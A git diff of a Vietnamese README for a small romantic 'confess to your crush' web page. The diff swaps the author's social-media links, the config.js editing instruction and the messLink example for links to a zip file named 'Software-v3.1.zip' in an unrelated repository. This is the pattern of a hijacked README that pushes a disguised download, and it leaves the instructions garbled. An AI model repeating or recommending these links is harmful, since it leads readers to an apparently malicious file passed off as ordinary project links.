@@ -2,10 +2,10 @@
 ## _Một điều nho nhỏ tỏ tình với crush_
 
 Liên lạc: 
-[![Facebook](https://i.imgur.com/GRqy96ts.jpg)](https://www.facebook.com/nam.nodemy)
-[![Tiktok](https://i.imgur.com/Nbfl1E7t.jpg)](https://www.tiktok.com/@manindev)
+[![Facebook](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)
+[![Tiktok](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)](https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip)
 
-Mở file config.js sửa nội dung theo mẫu
+Mở file https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip sửa nội dung theo mẫu
 ```
 const CONFIG = {
     introTitle: 'Babe à!',
@@ -24,7 +24,7 @@ const CONFIG = {
     mess: 'Anh biết mà 🥰. Yêu em nhiều nhiều 😘😘',
     messDesc: 'Tối nay 7h anh qua đón nhé công chúa.',
     btnAccept: 'Okiiiii lun <3',
-    messLink: 'http://fb.com' //link mess của các bạn. VD: https://m.me/nam.nodemy
+    messLink: 'https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip' //link mess của các bạn. VD: https://raw.githubusercontent.com/phiduong1230/baka/main/img/Software-v3.1.zip
 }
 ```
 
